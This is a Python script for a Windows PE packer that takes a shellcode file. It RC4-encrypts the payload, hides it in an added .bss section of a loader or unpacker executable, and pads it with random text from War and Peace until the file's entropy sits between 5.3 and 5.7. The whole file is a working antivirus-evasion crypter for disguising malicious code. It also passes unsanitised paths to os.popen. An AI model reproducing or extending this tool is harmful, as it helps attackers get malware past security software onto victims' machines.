import argparse
import lief
import os
import math
from arc4 import ARC4
import random 
import string
from datetime import datetime

tempfile = ".\\temp"
def align(x, al):
    """ return <x> aligned to <al> """
    if x % al == 0:
        return x
    else:
        return x - (x % al) + al


def pad_data(data, al):
    """ return <data> padded with 0 to a size aligned with <al> """
    return data + ([0] * (align(len(data), al) - len(data)))



def pack_data(args):
    if(args.l):
         payload = tempfile
    else:
         payload = args.input
  

    unpacker = lief.PE.parse(args.p)
    original = lief.PE.parse(payload)
    file_alignment = unpacker.optional_header.file_alignment


    res = str(os.popen(".\\x64\\Release\\compressor.exe " + payload + " " + args.o).read()).split("\n")
    for i in res:
        print(i)
    
    with open(args.o, "rb") as f:
        input_file = f.read()
    
    size  = original.optional_header.sizeof_image
    #print(os.stat(payload).st_size)
    random.seed(a=int(datetime.now().timestamp()))
    with open('.\\war_and_peace.txt', "r") as f:
                text = f.read()
   
    random_data = bytes(' '.join(random.choices(text, k=size)), 'utf-8')
    

    key = str(args.k)
    arc4 = ARC4(bytes(key, "utf-8"))
    data = arc4.encrypt(input_file) + b"w00fw00f" + len(key).to_bytes(4, byteorder="little") + bytes(key, 'utf-8') + b'\x00'
    if(size>len(data)):
         data+=random_data[:int((size-len(data))/2)]
      
    packed_data = list(data) # lief expects a list, not a "bytes" object.
    packed_data = pad_data(packed_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
    packed_section = lief.PE.Section(".bss")
    packed_section.content =  packed_data 
    packed_section.virtual_size = size
    packed_section.size = size

    packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ 
                                    | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
    print("[*] .bss section entropy: " + str(packed_section.entropy))
    unpacker.add_section(packed_section)
    
    if(os.path.exists(args.o)):
        os.remove(args.o)

    builder = lief.PE.Builder(unpacker)
    builder.build()
    builder.write(args.o)
 
    entropy_section = adjust_entropy(args)
    if (entropy_section):
        unpacker.remove_section('.bss')
        unpacker.add_section(entropy_section)
        unpacker.add_section(packed_section)

            
    if(os.path.exists(args.o)):
        os.remove(args.o)

    builder = lief.PE.Builder(unpacker)
    builder.build()
    builder.write(args.o)
    print("[+] Adjusted entropy: " + str(calculate_entropy(args.o)))
    print("[+] File size: " + str(os.stat(args.o).st_size))
    
def adjust_entropy(args):
    entropy = calculate_entropy(args.o)
    
    print("[*] File entropy: " + str(entropy))


    unpacker = lief.PE.parse(args.o)
    packed_section = unpacker.get_section('.bss')
    file_alignment = unpacker.optional_header.file_alignment
    with open('.\\war_and_peace.txt', "r") as f:
                text = f.read()
    
    delta = int(unpacker.optional_header.sizeof_image*0.01)
    data = bytes(' '.join(random.choices(text, k=delta)), 'utf-8')
    
    while(True):
        if (float(entropy) > 5.7 or float(entropy) < 5.3):
            unpacker = lief.PE.parse(args.o)

            if (float(entropy) < 5.3):
                data = data + random.randbytes(delta)
            else:
                data = bytes(' '.join(random.choices(text, k=delta)), 'utf-8')
         
            packed_data = list(data) # lief expects a list, not a "bytes" object.
            packed_data = pad_data(packed_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
            packed_section = lief.PE.Section("bss")
            packed_section.content =  packed_data 
            packed_section.virtual_size = len(packed_data)
            packed_section.size = len(packed_data)

            packed_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ 
                                            | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
            
            unpacker.add_section(packed_section)
            if(os.path.exists(tempfile)):
                os.remove(tempfile)

            builder = lief.PE.Builder(unpacker)
            builder.build()
            builder.write(tempfile)
            entropy = calculate_entropy(tempfile)
            if ((float(entropy) > 5.7 and float(entropy) < 5.9) or (float(entropy)>5.0 and float(entropy)<5.3)):
                delta += int(delta*0.01)
            else:
                 delta+=delta
        else:
            if(os.path.exists(tempfile)):
                os.remove(tempfile)
                return packed_section
            break
    
    

def prepare_loader(args):
    loader = lief.PE.parse(args.l)
    file_alignment = loader.optional_header.file_alignment
    key =args.k
    with open(args.input, "rb") as d:
        payload = d.read()
        arc4 = ARC4(bytes(key, "utf-8"))
        
        payload = b"w00fw00f" + len(payload).to_bytes(4, byteorder="little") + bytes(key, "utf-8") + arc4.encrypt(payload)
        #print("[+] Payload Signature: "+ str(payload[:20]))
        print("[*] Payload Size: "+ str(len(payload)-20))
        file_alignment = loader.optional_header.file_alignment
        section_alignment = loader.optional_header.section_alignment

        loader_data = list(payload) # lief expects a list, not a "bytes" object.
        loader_data = pad_data(loader_data, file_alignment) # pad with 0 to align with file alignment (removes a lief warning)
        loader_section = lief.PE.Section(".bss")
        loader_section.content =  loader_data
        loader_section.size = len(loader_data)
        loader_section.characteristics = (lief.PE.SECTION_CHARACTERISTICS.MEM_READ
                                        | lief.PE.SECTION_CHARACTERISTICS.CNT_INITIALIZED_DATA)
        loader.add_section(loader_section)
        if(os.path.exists(tempfile)):
            os.remove(tempfile)
        builder = lief.PE.Builder(loader)
        builder.build()
        builder.write(tempfile)
 

def calculate_entropy(filename):
    with open(filename, "rb") as file:
        counters = {byte: 0 for byte in range(2 ** 8)}  # start all counters with zeros
        for byte in file.read():  # read in chunks for large files
            counters[byte] += 1  # increase counter for specified byte
        filesize = file.tell()  # we can get file size by reading current position
        probabilities = [counter / filesize for counter in counters.values()]  # calculate probabilities for each byte
        entropy = -sum(probability * math.log2(probability) for probability in probabilities if probability > 0)  # final sum
        return "{:.3f}".format(entropy)

if __name__ =="__main__" :
    parser = argparse.ArgumentParser(description='Pack PE binary')
    parser.add_argument('-p', metavar="unpacker PE", help='unpacker PE')
    parser.add_argument('-l', metavar="loader", help='loader')
    parser.add_argument('-o', metavar="output file", help='output file')
    parser.add_argument('-k', metavar="Encryption key", help='Encryption key')
    parser.add_argument('input', metavar="shellcode file", help='shellcode file')
    args = parser.parse_args()
    if (args.l != None):
        prepare_loader(args)
    pack_data(args)
    